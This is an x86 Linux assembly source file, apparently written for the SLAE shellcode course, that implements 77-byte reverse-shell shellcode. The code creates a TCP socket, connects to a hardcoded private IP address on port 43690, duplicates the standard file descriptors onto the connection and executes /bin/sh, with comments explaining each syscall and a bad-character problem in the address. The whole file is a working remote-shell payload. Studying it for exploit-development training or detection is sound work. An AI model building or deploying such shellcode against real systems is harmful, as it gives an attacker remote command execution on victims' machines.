; Filename: reverse.nasm
; Author: Gitsnik SLAE-431
; Website:  http://dracyrys.com
;
; Purpose:
;	Reverse Connect a /bin/sh to tcp/43690 on specified host.
;
; Shellcode is [77] bytes.
;

global _start			

section .text
_start:
	xor eax, eax
	cdq

	;
	; sockfd = socket( 2, 1, 0 );
	;
	; Because we are using x86 not x86-64 all
	; these calls are done via the socketcall
	; interface.
	;
	; int socketcall( int call, *args );
	;
	mov al, 0x66

	push edx	; null
	inc edx
	mov ebx, edx	; EBX needs to be 1 for
			; the int 0x80 to work

	push edx	; 1
	inc edx	
	push edx	; 2

	mov ecx, esp
	int 0x80

	xchg eax, edx		; sockfd in edx for safe keeping

	;
	; Stack is currently
	;	2
	;	1
	;	0
	;
	; serv_addr requires ipaddress,port,2 much like
	; our previous incursion with bind.nasm
	;
	pop ebx
	inc ebx

	push 0x550A11AC		; WARNING: 0a is a bad character.
				; Will need to encode this out or
				; use a different IP address.
				; IP address is in reverse format
				; 85.10.17.172 =t= 172.17.10.85

	push word 0xAAAA	; port 43690
	push word ax		; 2

	mov ecx, esp		; ecx points to stack arguments
				; for sockaddr
	push 0x10		; sizeof() = 16
	push ecx		; sockaddr
	push edx		; socket

	add al, 0x64
	mov ecx, esp
	int 0x80

	;
	; dup2 loop
	;
	xchg edx, ebx		; EBX is clientfd, edx is 3
	xor ecx, ecx
	add cl, 0x02

	dup:
		mov al, 0x3f	; syscall 63
		int 0x80
		dec cl
		jns dup		; if no sign on cl (e.g. > -1 ) loop

	;
	; execve
	;
	; execve( shell[0], 0, 0 );
	;
	; xor eax, eax		; dup2 exits as null
	push eax
	push 0x68732f6e		; hs/n
	push 0x69622f2f		; ib//
	mov ebx, esp		; ebx points to location.

	xor ecx, ecx
	cdq
	mov al, 0x0b		; syscall 11 (execve)
	
	int 0x80

section .data
